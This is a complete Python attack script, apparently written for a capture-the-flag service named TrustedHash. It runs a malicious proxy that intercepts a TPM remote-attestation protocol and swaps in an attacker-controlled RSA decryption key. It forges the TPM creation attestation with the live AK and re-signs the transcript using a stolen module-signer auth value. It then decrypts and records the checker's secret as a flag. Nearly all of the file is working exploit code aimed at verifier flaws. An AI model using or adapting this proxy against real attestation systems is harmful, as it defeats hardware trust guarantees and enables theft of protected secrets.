#!/usr/bin/env python3
"""TrustedHash malicious attestation proxy.

The real kernel-backed agent runs on BACKEND. This proxy forwards its genuine
EK/PCR/AK flow, substitutes a software RSA decrypt key, forges the AK creation
attestation with the live empty-auth AK, and re-signs the complete transcript
with the recovered persistent module-signer auth.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import json
import os
import re
import shutil
import socket
import struct
import subprocess
import tempfile
import threading
import time
from pathlib import Path
from typing import Any

TPM_TCTI = "device:/dev/tpm0"
MODULE_SIGNER_HANDLE = "0x81010020"
TRANSCRIPT_LABEL = b"trusted_hash_module_signer_v1"
TPM_ALG_RSA = 0x0001
TPM_ALG_SHA256 = 0x000B
TPM_ALG_NULL = 0x0010
TPM_ALG_RSASSA = 0x0014
TPM_ALG_OAEP = 0x0017
TPM_GENERATED_VALUE = 0xFF544347
TPM_ST_ATTEST_CREATION = 0x801A
DECRYPT_KEY_ATTRS = (1 << 1) | (1 << 4) | (1 << 5) | (1 << 10) | (1 << 17)
MAX_FRAME = 64 * 1024


def b64d(value: str) -> bytes:
    return base64.b64decode(value, validate=True)


def b64e(value: bytes) -> str:
    return base64.b64encode(value).decode()


def recv_exact(sock: socket.socket, size: int) -> bytes:
    chunks: list[bytes] = []
    left = size
    while left:
        chunk = sock.recv(left)
        if not chunk:
            raise EOFError("connection closed")
        chunks.append(chunk)
        left -= len(chunk)
    return b"".join(chunks)


def recv_json(sock: socket.socket) -> dict[str, Any]:
    size = struct.unpack(">I", recv_exact(sock, 4))[0]
    if size > MAX_FRAME:
        raise ValueError(f"oversized frame: {size}")
    body = recv_exact(sock, size)
    value = json.loads(body)
    if not isinstance(value, dict):
        raise ValueError("protocol frame is not a JSON object")
    return value


def send_json(sock: socket.socket, value: dict[str, Any]) -> None:
    body = json.dumps(value, separators=(",", ":")).encode()
    if len(body) > MAX_FRAME:
        raise ValueError(f"oversized response frame: {len(body)}")
    sock.sendall(struct.pack(">I", len(body)) + body)


def run(
    cmd: list[str],
    *,
    input_data: bytes | None = None,
    check: bool = True,
) -> subprocess.CompletedProcess[bytes]:
    result = subprocess.run(
        cmd,
        input=input_data,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    if check and result.returncode != 0:
        raise RuntimeError(
            f"command failed ({result.returncode}): {' '.join(cmd)}\n"
            f"stdout: {result.stdout.decode(errors='replace')}\n"
            f"stderr: {result.stderr.decode(errors='replace')}"
        )
    return result


def need_tools() -> None:
    required = [
        "openssl",
        "tpm2_getcap",
        "tpm2_sign",
        "tpm2_hash",
    ]
    missing = [name for name in required if shutil.which(name) is None]
    if missing:
        raise SystemExit(f"missing commands: {', '.join(missing)}")
    if os.geteuid() != 0:
        raise SystemExit("run this proxy as root")
    if not Path("/dev/tpm0").exists():
        raise SystemExit("/dev/tpm0 is missing")


def tpm2b(value: bytes) -> bytes:
    if len(value) > 0xFFFF:
        raise ValueError("TPM2B value too large")
    return struct.pack(">H", len(value)) + value


def transcript_field(value: bytes) -> bytes:
    return struct.pack(">I", len(value)) + value


def parse_rsa_modulus(private_key: Path) -> bytes:
    result = run(["openssl", "rsa", "-in", str(private_key), "-noout", "-modulus"])
    match = re.search(rb"Modulus=([0-9A-Fa-f]+)", result.stdout)
    if not match:
        raise RuntimeError("failed to parse OpenSSL RSA modulus")
    modulus = bytes.fromhex(match.group(1).decode())
    if len(modulus) > 256:
        raise RuntimeError(f"RSA modulus is too large: {len(modulus)}")
    return modulus.rjust(256, b"\0")


def make_fake_decrypt_public(private_key: Path, policy_digest: bytes) -> tuple[bytes, bytes]:
    if len(policy_digest) != 32:
        raise ValueError("policy digest must be 32 bytes")
    modulus = parse_rsa_modulus(private_key)
    area = b"".join(
        [
            struct.pack(">H", TPM_ALG_RSA),
            struct.pack(">H", TPM_ALG_SHA256),
            struct.pack(">I", DECRYPT_KEY_ATTRS),
            tpm2b(policy_digest),
            struct.pack(">H", TPM_ALG_NULL),
            struct.pack(">H", TPM_ALG_OAEP),
            struct.pack(">H", TPM_ALG_SHA256),
            struct.pack(">H", 2048),
            struct.pack(">I", 0),  # default exponent 65537
            tpm2b(modulus),
        ]
    )
    public = tpm2b(area)
    name = struct.pack(">H", TPM_ALG_SHA256) + hashlib.sha256(area).digest()
    return public, name


def make_fake_creation_attest(challenge: bytes, object_name: bytes) -> tuple[bytes, bytes]:
    if len(challenge) != 32:
        raise ValueError("challenge must be 32 bytes")
    inner = b"".join(
        [
            struct.pack(">I", TPM_GENERATED_VALUE),
            struct.pack(">H", TPM_ST_ATTEST_CREATION),
            tpm2b(b""),  # qualifiedSigner is ignored by the verifier
            tpm2b(challenge),
            b"\0" * 17,  # TPMS_CLOCK_INFO
            b"\0" * 8,   # firmwareVersion
            tpm2b(object_name),
            tpm2b(b""),  # creationHash is parsed but never checked
        ]
    )
    return tpm2b(inner), inner


def make_module_transcript(create: dict[str, Any], challenge: bytes) -> bytes:
    fields = [
        TRANSCRIPT_LABEL,
        challenge,
        struct.pack(">I", int(create["pcr_mask"])),
        b64d(create["pcr_digest"]),
        b64d(create["policy_digest"]),
        b64d(create["ak_name"]),
        b64d(create["decrypt_key_name"]),
        b64d(create["ak_public"]),
        b64d(create["decrypt_key_public"]),
        b64d(create["certify_info"]),
        b64d(create["certify_signature"]),
        b64d(create["module_signer_name"]),
    ]
    return b"".join(transcript_field(field) for field in fields)


def transient_handles() -> list[int]:
    result = run(["tpm2_getcap", "-T", TPM_TCTI, "handles-transient"])
    handles = sorted({int(item, 16) for item in re.findall(rb"0x8[0-9A-Fa-f]{7}", result.stdout)})
    return handles


def der_len(size: int) -> bytes:
    if size < 0x80:
        return bytes([size])
    raw = size.to_bytes((size.bit_length() + 7) // 8, "big")
    return bytes([0x80 | len(raw)]) + raw


def der_tlv(tag: int, body: bytes) -> bytes:
    return bytes([tag]) + der_len(len(body)) + body


def der_integer(value: bytes) -> bytes:
    value = value.lstrip(b"\0") or b"\0"
    if value[0] & 0x80:
        value = b"\0" + value
    return der_tlv(0x02, value)


def rsa_public_pem(tpm_public: bytes) -> bytes:
    if len(tpm_public) < 2:
        raise ValueError("short TPM2B_PUBLIC")
    outer_len = struct.unpack_from(">H", tpm_public, 0)[0]
    area = memoryview(tpm_public)[2:]
    if outer_len != len(area):
        raise ValueError("bad TPM2B_PUBLIC length")
    off = 0

    def u16() -> int:
        nonlocal off
        value = struct.unpack_from(">H", area, off)[0]
        off += 2
        return value

    def u32() -> int:
        nonlocal off
        value = struct.unpack_from(">I", area, off)[0]
        off += 4
        return value

    def take2b() -> bytes:
        nonlocal off
        size = u16()
        value = bytes(area[off : off + size])
        off += size
        return value

    if u16() != TPM_ALG_RSA:
        raise ValueError("not RSA")
    _name_alg = u16()
    _attrs = u32()
    _policy = take2b()
    symmetric = u16()
    if symmetric == 0x0006:  # AES
        u16(); u16()
    elif symmetric != TPM_ALG_NULL:
        raise ValueError("unexpected symmetric algorithm")
    scheme = u16()
    if scheme != TPM_ALG_NULL:
        u16()
    _bits = u16()
    exponent = u32() or 65537
    modulus = take2b()
    if off != len(area):
        raise ValueError("trailing TPM public bytes")

    rsa = der_tlv(0x30, der_integer(modulus) + der_integer(exponent.to_bytes(4, "big")))
    oid_rsa = der_tlv(0x06, bytes.fromhex("2a864886f70d010101"))
    alg = der_tlv(0x30, oid_rsa + der_tlv(0x05, b""))
    spki = der_tlv(0x30, alg + der_tlv(0x03, b"\0" + rsa))
    encoded = base64.encodebytes(spki).replace(b"\n", b"")
    lines = [encoded[i : i + 64] for i in range(0, len(encoded), 64)]
    return b"-----BEGIN PUBLIC KEY-----\n" + b"\n".join(lines) + b"\n-----END PUBLIC KEY-----\n"


def raw_tss_signature(signature: bytes) -> bytes:
    if len(signature) < 6:
        raise ValueError("short TPMT_SIGNATURE")
    alg, hash_alg, size = struct.unpack_from(">HHH", signature, 0)
    if alg != TPM_ALG_RSASSA or hash_alg != TPM_ALG_SHA256:
        raise ValueError(f"unexpected signature scheme 0x{alg:04x}/0x{hash_alg:04x}")
    raw = signature[6:]
    if len(raw) != size:
        raise ValueError("bad TPM signature length")
    return raw


def verify_signature(public: bytes, message: bytes, signature: bytes, workdir: Path, label: str) -> None:
    public_path = workdir / f"{label}.pub.pem"
    message_path = workdir / f"{label}.message.bin"
    signature_path = workdir / f"{label}.signature.bin"
    public_path.write_bytes(rsa_public_pem(public))
    message_path.write_bytes(message)
    signature_path.write_bytes(raw_tss_signature(signature))
    result = run(
        [
            "openssl",
            "dgst",
            "-sha256",
            "-verify",
            str(public_path),
            "-signature",
            str(signature_path),
            str(message_path),
        ],
        check=False,
    )
    if result.returncode != 0:
        raise RuntimeError(f"local verification of {label} signature failed")


def sign_message(
    handle: str,
    message: bytes,
    output: Path,
    workdir: Path,
    *,
    auth_hex: str | None = None,
    restricted: bool,
) -> bytes:
    message_path = workdir / f"message-{handle.replace('0x', '')}.bin"
    message_path.write_bytes(message)
    output.unlink(missing_ok=True)

    base = [
        "tpm2_sign",
        "-Q",
        "-T",
        TPM_TCTI,
        "-c",
        handle,
        "-g",
        "sha256",
        "-s",
        "rsassa",
        "-f",
        "tss",
        "-o",
        str(output),
    ]
    if auth_hex is not None:
        base += ["-p", f"hex:{auth_hex}"]

    # tpm2-tools normally hashes a message and obtains the validation ticket
    # itself. Try that first because it works for both unrestricted and
    # restricted RSA signing keys on current releases.
    direct = run(base + [str(message_path)], check=False)
    if direct.returncode == 0 and output.is_file():
        return output.read_bytes()

    if not restricted:
        raise RuntimeError(
            "module signer failed: " + direct.stderr.decode(errors="replace")
        )

    # Compatibility path for versions requiring an explicit hash-check ticket
    # when TPM2_Sign uses a restricted AK.
    digest = workdir / "ak.digest.bin"
    ticket = workdir / "ak.ticket.bin"
    run(
        [
            "tpm2_hash",
            "-Q",
            "-T",
            TPM_TCTI,
            "-C",
            "o",
            "-g",
            "sha256",
            "-o",
            str(digest),
            "-t",
            str(ticket),
            str(message_path),
        ]
    )

    variants = [
        base + ["-d", str(digest), "-t", str(ticket)],
        base + ["-t", str(ticket), str(digest)],
    ]
    errors: list[str] = []
    for command in variants:
        output.unlink(missing_ok=True)
        result = run(command, check=False)
        if result.returncode == 0 and output.is_file():
            return output.read_bytes()
        errors.append(result.stderr.decode(errors="replace"))
    raise RuntimeError("restricted AK signing failed:\n" + "\n".join(errors))


class Proxy:
    def __init__(
        self,
        backend: tuple[str, int],
        private_key: Path,
        signer_auth: bytes,
        flag_output: Path,
    ) -> None:
        self.backend = backend
        self.private_key = private_key
        self.signer_auth_hex = signer_auth.hex()
        self.flag_output = flag_output
        self.lock = threading.Lock()

    def handle(self, client: socket.socket, peer: tuple[str, int]) -> None:
        # The kernel module stores sessions globally and create_session deletes
        # older sessions, so serialize checker connections deliberately.
        with self.lock:
            print(f"[*] checker connected from {peer[0]}:{peer[1]}", flush=True)
            with socket.create_connection(self.backend, timeout=15) as backend:
                client.settimeout(180)
                backend.settimeout(180)
                session_id: int | None = None
                try:
                    while True:
                        request = recv_json(client)
                        kind = request.get("type")
                        if kind == "create_session":
                            send_json(backend, request)
                            response = recv_json(backend)
                            if response.get("type") != "create_session":
                                send_json(client, response)
                                continue
                            response, session_id = self.forge_create(request, response)
                            send_json(client, response)
                        elif kind == "activate_credential":
                            send_json(backend, request)
                            send_json(client, recv_json(backend))
                        elif kind == "trusted_hash":
                            self.answer_trusted_hash(client, backend, request, session_id)
                        else:
                            send_json(backend, request)
                            send_json(client, recv_json(backend))
                except EOFError:
                    pass
                finally:
                    print(f"[*] checker connection from {peer[0]} closed", flush=True)

    def forge_create(
        self, request: dict[str, Any], create: dict[str, Any]
    ) -> tuple[dict[str, Any], int]:
        challenge = b64d(str(request["challenge"]))
        policy_digest = b64d(str(create["policy_digest"]))
        fake_public, fake_name = make_fake_decrypt_public(self.private_key, policy_digest)
        certify_info, attest_inner = make_fake_creation_attest(challenge, fake_name)

        handles = transient_handles()
        if len(handles) != 1:
            raise RuntimeError(
                f"expected exactly one live transient AK handle after create_session, got "
                f"{[hex(handle) for handle in handles]}"
            )
        ak_handle = f"0x{handles[0]:08x}"
        print(f"[+] live kernel AK handle: {ak_handle}", flush=True)

        workdir = Path(tempfile.mkdtemp(prefix="trustedhash-forge-", dir="/tmp"))
        try:
            certify_signature = sign_message(
                ak_handle,
                attest_inner,
                workdir / "certify.sig",
                workdir,
                restricted=True,
            )
            verify_signature(
                b64d(str(create["ak_public"])),
                attest_inner,
                certify_signature,
                workdir,
                "ak",
            )

            create = dict(create)
            create["decrypt_key_public"] = b64e(fake_public)
            create["decrypt_key_name"] = b64e(fake_name)
            create["certify_info"] = b64e(certify_info)
            create["certify_signature"] = b64e(certify_signature)

            transcript = make_module_transcript(create, challenge)
            module_signature = sign_message(
                MODULE_SIGNER_HANDLE,
                transcript,
                workdir / "module.sig",
                workdir,
                auth_hex=self.signer_auth_hex,
                restricted=False,
            )
            verify_signature(
                b64d(str(create["module_signer_public"])),
                transcript,
                module_signature,
                workdir,
                "module",
            )
            create["module_signature"] = b64e(module_signature)
        finally:
            shutil.rmtree(workdir, ignore_errors=True)

        session_id = int(create["session_id"])
        print(f"[+] forged trusted create_session transcript for session {session_id}", flush=True)
        return create, session_id

    def answer_trusted_hash(
        self,
        client: socket.socket,
        backend: socket.socket,
        request: dict[str, Any],
        session_id: int | None,
    ) -> None:
        ciphertext = b64d(str(request["encrypted_blob"]))
        workdir = Path(tempfile.mkdtemp(prefix="trustedhash-decrypt-", dir="/tmp"))
        try:
            cipher_path = workdir / "ciphertext.bin"
            cipher_path.write_bytes(ciphertext)
            result = run(
                [
                    "openssl",
                    "pkeyutl",
                    "-decrypt",
                    "-inkey",
                    str(self.private_key),
                    "-in",
                    str(cipher_path),
                    "-pkeyopt",
                    "rsa_padding_mode:oaep",
                    "-pkeyopt",
                    "rsa_oaep_md:sha256",
                    "-pkeyopt",
                    "rsa_mgf1_md:sha256",
                ]
            )
            plaintext = result.stdout
        finally:
            shutil.rmtree(workdir, ignore_errors=True)

        self.flag_output.parent.mkdir(parents=True, exist_ok=True)
        with self.flag_output.open("ab") as file:
            file.write(plaintext + b"\n")
        self.flag_output.chmod(0o600)

        digest = hashlib.sha256(plaintext).digest()
        send_json(client, {"type": "trusted_hash", "result": b64e(digest)})

        # The backend session is no longer needed because the checker encrypted
        # to our software key. Clean it up so the TPM has no stale AK handle.
        if session_id is not None:
            try:
                send_json(backend, {"type": "cancel_session", "session_id": session_id})
                recv_json(backend)
            except Exception as exc:  # best effort only
                print(f"[!] backend cancel failed: {exc}", flush=True)

        printable = plaintext.decode(errors="replace")
        print(f"[+] recovered plaintext: {printable}", flush=True)
        print(f"<FLAG>{printable}</FLAG>", flush=True)


def parse_address(value: str) -> tuple[str, int]:
    host, sep, port = value.rpartition(":")
    if not sep or not host:
        raise argparse.ArgumentTypeError("address must be HOST:PORT")
    return host, int(port)


def ensure_private_key(path: Path) -> None:
    if path.is_file():
        return
    path.parent.mkdir(parents=True, exist_ok=True)
    run(
        [
            "openssl",
            "genpkey",
            "-algorithm",
            "RSA",
            "-pkeyopt",
            "rsa_keygen_bits:2048",
            "-out",
            str(path),
        ]
    )
    path.chmod(0o600)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--listen", type=parse_address, default=("0.0.0.0", 31337))
    parser.add_argument("--backend", type=parse_address, default=("127.0.0.1", 31338))
    parser.add_argument(
        "--signer-auth",
        type=Path,
        default=Path("/root/trustedhash/module_signer_auth.bin"),
    )
    parser.add_argument(
        "--private-key",
        type=Path,
        default=Path("/root/trustedhash/attacker-rsa.pem"),
    )
    parser.add_argument(
        "--flag-output",
        type=Path,
        default=Path("/root/trustedhash/flags.txt"),
    )
    args = parser.parse_args()

    need_tools()
    if not args.signer_auth.is_file():
        raise SystemExit(f"missing signer auth: {args.signer_auth}; run recover_auth.py first")
    signer_auth = args.signer_auth.read_bytes()
    if len(signer_auth) != 32:
        raise SystemExit(f"signer auth has wrong length: {len(signer_auth)}")
    ensure_private_key(args.private_key)

    proxy = Proxy(args.backend, args.private_key, signer_auth, args.flag_output)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(args.listen)
        listener.listen(16)
        print(
            f"[+] proxy listening on {args.listen[0]}:{args.listen[1]}, "
            f"backend={args.backend[0]}:{args.backend[1]}",
            flush=True,
        )
        while True:
            client, peer = listener.accept()
            with client:
                try:
                    proxy.handle(client, peer)
                except Exception as exc:
                    print(f"[-] connection failed: {exc}", flush=True)
                    try:
                        send_json(client, {"type": "error", "code": -1, "message": str(exc)})
                    except Exception:
                        pass
            time.sleep(0.05)


if __name__ == "__main__":
    raise SystemExit(main())
